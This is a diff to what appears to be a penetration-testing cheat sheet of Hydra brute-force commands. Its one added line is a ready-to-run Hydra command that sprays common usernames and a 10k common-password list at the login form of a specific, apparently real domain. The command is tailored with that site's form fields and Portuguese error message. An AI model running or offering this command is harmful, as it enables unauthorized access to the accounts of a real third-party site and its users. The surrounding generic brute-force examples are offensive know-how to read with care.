@@ -413,6 +413,9 @@ hydra -C /usr/share/legion/wordlists/ssh-betterdefaultpasslist.txt -M ssh_server
 
 FOR HTTP FORM
 hydra -L [user] -P [password] [IP] http-post-form "/:usernam=^USER^ & password=^PASS^:F=incorrect" -V
+
+hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt https://csc.compwire.com.br  http-post-form "/Account/Login:hdnErrorFromServer=&hdnGeo=&hdnIP=&username=^USER^&password=^PASS^:Falha no login. Verifique o seu nome de usuário/senha e tente novamente." -V 
+
 ```
 # John
 ```
